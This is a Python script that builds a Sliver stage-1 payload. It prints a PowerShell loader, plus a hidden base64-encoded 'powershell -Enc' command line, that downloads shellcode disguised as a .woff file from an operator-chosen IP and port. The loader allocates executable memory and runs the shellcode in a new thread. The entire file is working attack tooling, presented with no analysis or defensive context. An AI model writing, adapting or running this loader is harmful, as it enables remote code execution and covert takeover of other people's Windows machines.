import sys
import base64

def help():
   print("USAGE: %s IP PORT" % sys.argv[0])
   print("Returns sliver stage1 Powershell base64 encoded cmdline payload connecting to IP:PORT")
   exit()

try:
   ip = sys.argv[1]
   port = str(sys.argv[2])
except:
   help()

buf = '$Win32 = @"\n'
buf += 'using System;\n'
buf += 'using System.Runtime.InteropServices;\n'
buf += 'public class Win32 {\n'
buf += '[DllImport("kernel32")]\n'
buf += 'public static extern IntPtr VirtualAlloc(IntPtr lpAddress,\n'
buf += '    uint dwSize,\n'
buf += '    uint flAllocationType,\n'
buf += '    uint flProtect);\n'
buf += '[DllImport("kernel32", CharSet=CharSet.Ansi)]\n'
buf += 'public static extern IntPtr CreateThread(\n'
buf += '    IntPtr lpThreadAttributes,\n'
buf += '    uint dwStackSize,\n'
buf += '    IntPtr lpStartAddress,\n'
buf += '    IntPtr lpParameter,  \n'
buf += '    uint dwCreationFlags,\n'
buf += '    IntPtr lpThreadId);\n'
buf += '[DllImport("kernel32.dll", SetLastError=true)]  \n'
buf += 'public static extern UInt32 WaitForSingleObject(\n'
buf += '    IntPtr hHandle,\n'
buf += '    UInt32 dwMilliseconds);\n'
buf += '} \n'
buf += '"@\n'
buf += 'Add-Type $Win32\n'
buf += '\n'
buf += '$shellcode = (New-Object System.Net.WebCLient).DownloadData("http://'+ip+':'+port+'/l4rry.woff")\n'
buf += 'if ($shellcode -eq $null) {Exit};\n'
buf += '$size = $shellcode.Length\n'
buf += '\n'
buf += '[IntPtr]$addr = [Win32]::VirtualAlloc(0,$size,0x1000,0x40); \n'
buf += '[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)\n'
buf += '$thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);\n'
buf += '[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")\n'

payload = buf

#payload = payload % (ip, port)

cmdline = "powershell.exe -nop -w hidden -Enc " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print ("RAW:\n")
print (payload)
print ("\n")
print ("BASE64\n")
print (cmdline)
